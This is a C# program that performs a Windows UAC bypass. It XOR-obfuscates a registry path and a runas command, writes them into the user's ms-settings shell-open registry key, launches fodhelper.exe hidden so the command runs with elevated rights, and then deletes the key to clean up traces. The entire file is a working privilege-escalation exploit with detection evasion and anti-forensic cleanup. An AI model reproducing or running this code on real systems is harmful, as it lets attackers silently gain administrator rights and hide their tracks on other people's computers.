using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace MyApp
{
    class Program
    {
       
        private const byte XorKey = 0x7A;

        private static readonly byte[] EncryptedRegPath = new byte[]  // Software\Classes\ms-settings\Shell\Open\command
        {
            0x29, 0x15, 0x1C, 0x0E, 0x0D, 0x1B, 0x08, 0x1F, 0x26, 0x39, 0x16, 0x1B, 0x09, 0x09, 0x1F, 0x09,
            0x26, 0x17, 0x09, 0x57, 0x09, 0x1F, 0x0E, 0x0E, 0x13, 0x14, 0x1D, 0x09, 0x26, 0x29, 0x12, 0x1F,
            0x16, 0x16, 0x26, 0x35, 0x0A, 0x1F, 0x14, 0x26, 0x19, 0x15, 0x17, 0x17, 0x1B, 0x14, 0x1E
        };


        private static readonly byte[] EncryptedPayloadBase = new byte[]  //runas.exe /trustlevel:0x40000 
        {
            0x08, 0x0F, 0x14, 0x1B, 0x09, 0x54, 0x1F, 0x02, 0x1F, 0x5A, 0x55, 0x0E, 0x08, 0x0F, 0x09, 0x0E,
            0x16, 0x1F, 0x0C, 0x1F, 0x16, 0x40, 0x4A, 0x02, 0x4E, 0x4A, 0x4A, 0x4A, 0x4A, 0x5A
        };


        private static string Decrypt(byte[] encryptedData)
        {
            byte[] decrypted = new byte[encryptedData.Length];
            for (int i = 0; i < encryptedData.Length; i++)
            {
                decrypted[i] = (byte)(encryptedData[i] ^ XorKey);
            }
            return Encoding.ASCII.GetString(decrypted);
        }

        public static void Main(string[] args)
        {
            if (!IsTrueAdmin())
            {
                string currentExePath = Environment.ProcessPath;

                if (string.IsNullOrEmpty(currentExePath))
                {
                    currentExePath = Assembly.GetExecutingAssembly().Location;
                }


                string regPath = Decrypt(EncryptedRegPath);
                string payloadBase = Decrypt(EncryptedPayloadBase);

                //  runas.exe /trustlevel:0x40000 "C:\Path\To\App.exe"
                string fullPayload = $"{payloadBase} \"{currentExePath}\"";

                bool isKeyCreated = false;

                try
                {

                    using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryOptions.Volatile))
                    {
                        if (key != null)
                        {
                            key.SetValue("", fullPayload, RegistryValueKind.String);
                            key.SetValue("DelegateExecute", "", RegistryValueKind.String);
                            isKeyCreated = true;
                            Console.WriteLine("Registry entries successfully added.");
                        }
                    }


                    ProcessStartInfo startInfo = new ProcessStartInfo
                    {
                        FileName = "fodhelper.exe",
                        UseShellExecute = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    using (Process process = Process.Start(startInfo))
                    {
                        Console.WriteLine("fodhelper.exe executed.");

                        Thread.Sleep(3000);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error during UAC bypass: { ex.Message}");
                }
                finally
                {

                    if (isKeyCreated)
                    {
                        try
                        {
                            using (RegistryKey classesKey = Registry.CurrentUser.OpenSubKey(@"Software\Classes", true))
                            {
                                if (classesKey != null)
                                {
                                    Thread.Sleep(4000);
                                    classesKey.DeleteSubKeyTree("ms-settings", false);
                                    Console.WriteLine("Registry cleanup completed. System returned to original state");
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Error while cleaning up traces: {ex.Message}");
                        }
                    }
                }


                Console.WriteLine("Transferring control to elevated process. Closing.");
                Environment.Exit(0);
            }

            Console.WriteLine("The program is running with administrator privileges.");
            Console.ReadLine();

        }
        public static bool IsTrueAdmin()
        {
            try
            {
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);

                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
                }   
            }
            catch
            {
                return false;
            }
        }
    }
}